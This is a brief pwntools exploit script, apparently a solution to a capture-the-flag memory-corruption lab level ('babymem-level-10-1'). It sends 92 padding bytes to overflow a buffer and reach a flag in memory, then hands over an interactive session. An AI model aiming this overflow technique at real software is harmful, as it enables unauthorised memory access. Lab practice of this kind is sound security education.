from pwn import *


offset_buff_to_flag = 92
proc = process('/challenge/babymem-level-10-1')
proc.recvuntil(b'size: ')
proc.sendline(str(offset_buff_to_flag).encode())
proc.recvuntil(b'!\n')
payload = b'A' * offset_buff_to_flag
proc.sendline(payload)
proc.interactive()
